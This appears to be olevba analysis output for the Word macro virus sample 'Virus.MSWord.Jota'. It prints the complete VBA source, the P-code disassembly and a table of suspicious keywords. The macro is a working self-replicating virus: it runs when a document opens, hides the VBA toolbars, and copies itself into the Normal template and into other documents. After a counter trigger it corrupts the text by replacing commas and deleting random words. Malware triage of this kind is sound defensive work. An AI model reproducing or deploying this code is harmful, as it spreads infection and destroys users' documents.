olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jota
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO dllAD1k.cls 
in file: Virus.MSWord.Jota - OLE stream: 'Macros/VBA/dllAD1k'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















Private Sub Document_Open()
CommandBars("Visual Basic").Visible = False
CommandBars("Stop Recording").Visible = False
On Error Resume Next
Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
y = 0
jota = 0
'AD
If nt.Name <> "dllnt1k" Then
GoSub killoldnt:
polncopynt:
copynt:
  y = y + 1
 cadecodi = ad.codemodule.Lines(jota, 1)
     nt.codemodule.InsertLines y, cadecodi
jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww = 1
If y > 500 Then GoTo xxxxxx2:
If ww = 1 Then www = www + 1
If www > 4 Then GoTo xxxxxx4:
GoTo copynt:
xxxxxx4:
   nt.Name = "dllnt1k"
   NormalTemplate.Save
GoTo xxxxxx2:
Else
End If
'nt
If ad.Name <> "dllAD1k" Then
GoSub killoldad:
copyAD:
     y = y + 1
     cadecodi = nt.codemodule.Lines(jota, 1)
      ad.codemodule.InsertLines y, cadecodi
     If cadecodi = "'tttn" Then GoTo eeee
GoTo rrr:
eeee:
      jota = jota + 1
     cadecodi = nt.codemodule.Lines(jota, 1)
     If cadecodi = "'ttte" Then jota = jota - 2: GoTo rrr
     GoTo eeee:
rrr:
     jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww1 = 1
If ww1 = 1 Then www1 = www1 + 1
If y > 500 Then GoTo xxxxxx2:
If www1 > 4 Then GoTo xxxxxx3:
GoTo copyAD:
xxxxxx3:
  ad.Name = "dllAD1k"
   ActiveDocument.SaveAs ActiveDocument.FullName
GoTo xxxxxx2:
Else
End If
polncopynt1:
copynt1:
cadecodi = nt.codemodule.Lines(jota, 1)
If cadecodi = "'tttn" Then ddd = jota: GoTo xxxxxx1:
jota = jota + 1
If nt.codemodule.Lines(jota, 1) = "End Sub" Then ww = 1
If jota > 300 Then GoTo xxxxxx2:
GoTo copynt1:
xxxxxx1:
ddd = ddd + 1
kk1 = nt.codemodule.Lines(ddd, 1)
If kk1 > 200 Then GoTo eeee11:
nt.codemodule.InsertLines ddd, Val(kk1) + 1
NormalTemplate.Save
GoTo xxxxxx2:
'tttn
1
'ttte
eeee11:
For dd = 1 To 100
ActiveDocument.Content.Find.Execute FindText:=",", ReplaceWith:=" áë˙" ', Replace:=wdReplaceAll, Format:=True
ActiveDocument.Words(Int(Rnd * 500)).Delete
Next dd
ActiveDocument.SaveAs ActiveDocument.FullName
ActiveDocument.Close
GoTo xxxxxx2:
killoldad:
For kil = 1 To 1000
ad.codemodule.DeleteLines 1
Next kil
Return
killoldnt:
For kil = 1 To 1000
nt.codemodule.DeleteLines 1
Next kil
Return
xxxxxx2:
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jota
' ===============================================================================
' Module streams:
' Macros/VBA/dllAD1k - 5291 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub Document_Open())
' Line #18:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #19:
' 	LitVarSpecial (False)
' 	LitStr 0x000E "Stop Recording"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Dim 
' 	VarDefn jota (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn y (As Integer)
' 	VarDefn cadecodi (As String)
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #24:
' 	LitDI2 0x0000 
' 	St y 
' Line #25:
' 	LitDI2 0x0000 
' 	St jota 
' Line #26:
' 	QuoteRem 0x0000 0x0002 "AD"
' Line #27:
' 	Ld nt 
' 	MemLd New 
' 	LitStr 0x0007 "dllnt1k"
' 	Ne 
' 	IfBlock 
' Line #28:
' 	GoSub killoldnt 
' 	BoS 0x0000 
' Line #29:
' 	Label polncopynt 
' Line #30:
' 	Label copynt 
' Line #31:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #32:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #33:
' 	Ld y 
' 	Ld cadecodi 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #35:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ww 
' 	EndIf 
' Line #36:
' 	Ld y 
' 	LitDI2 0x01F4 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' 	EndIf 
' Line #37:
' 	Ld ww 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld www 
' 	LitDI2 0x0001 
' 	Add 
' 	St www 
' 	EndIf 
' Line #38:
' 	Ld www 
' 	LitDI2 0x0004 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo xxxxxx4 
' 	BoS 0x0000 
' 	EndIf 
' Line #39:
' 	GoTo copynt 
' 	BoS 0x0000 
' Line #40:
' 	Label xxxxxx4 
' Line #41:
' 	LitStr 0x0007 "dllnt1k"
' 	Ld nt 
' 	MemSt New 
' Line #42:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	QuoteRem 0x0000 0x0002 "nt"
' Line #47:
' 	Ld ad 
' 	MemLd New 
' 	LitStr 0x0007 "dllAD1k"
' 	Ne 
' 	IfBlock 
' Line #48:
' 	GoSub killoldad 
' 	BoS 0x0000 
' Line #49:
' 	Label copyAD 
' Line #50:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #51:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #52:
' 	Ld y 
' 	Ld cadecodi 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	Ld cadecodi 
' 	LitStr 0x0005 "'tttn"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eeee 
' 	EndIf 
' Line #54:
' 	GoTo rrr 
' 	BoS 0x0000 
' Line #55:
' 	Label eeee 
' Line #56:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #57:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #58:
' 	Ld cadecodi 
' 	LitStr 0x0005 "'ttte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld jota 
' 	LitDI2 0x0002 
' 	Sub 
' 	St jota 
' 	BoS 0x0000 
' 	GoTo rrr 
' 	EndIf 
' Line #59:
' 	GoTo eeee 
' 	BoS 0x0000 
' Line #60:
' 	Label rrr 
' Line #61:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #62:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ww1 
' 	EndIf 
' Line #63:
' 	Ld ww1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld www1 
' 	LitDI2 0x0001 
' 	Add 
' 	St www1 
' 	EndIf 
' Line #64:
' 	Ld y 
' 	LitDI2 0x01F4 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' 	EndIf 
' Line #65:
' 	Ld www1 
' 	LitDI2 0x0004 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo xxxxxx3 
' 	BoS 0x0000 
' 	EndIf 
' Line #66:
' 	GoTo copyAD 
' 	BoS 0x0000 
' Line #67:
' 	Label xxxxxx3 
' Line #68:
' 	LitStr 0x0007 "dllAD1k"
' 	Ld ad 
' 	MemSt New 
' Line #69:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #70:
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' Line #71:
' 	ElseBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Label polncopynt1 
' Line #74:
' 	Label copynt1 
' Line #75:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St cadecodi 
' Line #76:
' 	Ld cadecodi 
' 	LitStr 0x0005 "'tttn"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld jota 
' 	St ddd 
' 	BoS 0x0000 
' 	GoTo xxxxxx1 
' 	BoS 0x0000 
' 	EndIf 
' Line #77:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Add 
' 	St jota 
' Line #78:
' 	Ld jota 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ww 
' 	EndIf 
' Line #79:
' 	Ld jota 
' 	LitDI2 0x012C 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' 	EndIf 
' Line #80:
' 	GoTo copynt1 
' 	BoS 0x0000 
' Line #81:
' 	Label xxxxxx1 
' Line #82:
' 	Ld ddd 
' 	LitDI2 0x0001 
' 	Add 
' 	St ddd 
' Line #83:
' 	Ld ddd 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St kk1 
' Line #84:
' 	Ld kk1 
' 	LitDI2 0x00C8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo eeee11 
' 	BoS 0x0000 
' 	EndIf 
' Line #85:
' 	Ld ddd 
' 	Ld kk1 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #86:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #87:
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' Line #88:
' 	QuoteRem 0x0000 0x0004 "tttn"
' Line #89:
' 	LineNum 1 
' Line #90:
' 	QuoteRem 0x0000 0x0004 "ttte"
' Line #91:
' 	Label eeee11 
' Line #92:
' 	StartForVariable 
' 	Ld dd 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #93:
' 	LitStr 0x0001 ","
' 	ParamNamed FindText 
' 	LitStr 0x0004 " áë˙"
' 	ParamNamed ReplaceWith 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0002 
' 	QuoteRem 0x0047 0x0025 ", Replace:=wdReplaceAll, Format:=True"
' Line #94:
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #95:
' 	StartForVariable 
' 	Ld dd 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #97:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #98:
' 	GoTo xxxxxx2 
' 	BoS 0x0000 
' Line #99:
' 	Label killoldad 
' Line #100:
' 	StartForVariable 
' 	Ld kil 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #101:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #102:
' 	StartForVariable 
' 	Ld kil 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	Return 
' Line #104:
' 	Label killoldnt 
' Line #105:
' 	StartForVariable 
' 	Ld kil 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #106:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #107:
' 	StartForVariable 
' 	Ld kil 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Return 
' Line #109:
' 	Label xxxxxx2 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' Line #113:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

